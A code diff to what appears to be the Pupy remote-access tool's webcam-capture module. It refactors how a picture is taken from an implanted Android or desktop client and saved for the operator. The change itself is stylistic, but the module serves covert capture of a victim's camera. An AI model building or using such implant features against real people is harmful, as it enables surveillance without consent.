@@ -64,12 +64,13 @@ class WebcamSnapModule(PupyModule):
             buff, width, height = dev.getbuffer()
             pil_save(filepath, buff, width, height)
         elif self.client.is_android():
-            if args.nb_cameras == True:
-                self.success("[+] Number of cameras: {0}".format(self.client.conn.modules['pupydroid.camera'].numberOfCameras()))
+            if args.nb_cameras:
+                self.success("Number of cameras: {0}".format(self.client.conn.modules['pupydroid.camera'].numberOfCameras()))
                 return
-            data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device, args.jpg_quality)
-            with open(filepath,"w") as f:
-                f.write(data)
+            else:
+                data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device, args.jpg_quality)
+                with open(filepath,"w") as f:
+                    f.write(data)
         if args.view:
             subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
         self.success("webcam picture saved to %s"%filepath)
